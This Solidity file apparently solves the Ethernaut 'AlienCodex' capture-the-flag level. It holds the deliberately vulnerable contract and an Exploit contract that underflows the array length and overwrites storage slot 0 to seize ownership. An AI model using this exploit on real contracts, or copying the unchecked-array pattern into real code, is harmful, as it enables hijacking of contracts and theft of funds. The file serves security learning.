// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import './Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function makeContact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}

contract Exploit {
  uint256 public constant MAX_UINT256 = (2 ** 256) - 1;
  uint256 public constant CODEX_ARRAY_STORAGE_LOCATION = uint256(keccak256(abi.encode(1)));
  AlienCodex alienCodex;

  constructor(address _alienCodex) public {
      alienCodex = AlienCodex(_alienCodex);
  }

  function exploit () external {
      // + 1 to go in overflow, which will result in 0, and that is storage slot od owner and contact variables
      uint index = MAX_UINT256 - CODEX_ARRAY_STORAGE_LOCATION + 1; 

      // address as bytes32
      bytes32 contractAddressAsBytes32 = bytes32(uint256(uint160(address(this))));
      
      alienCodex.makeContact();

      // calling retract to make array length as UINT256 max value, as it will go in underflow
      alienCodex.retract();

      // call with index that will store on 0 sotrage slot our address for owner variable
      alienCodex.revise(index, contractAddressAsBytes32);
  }
} 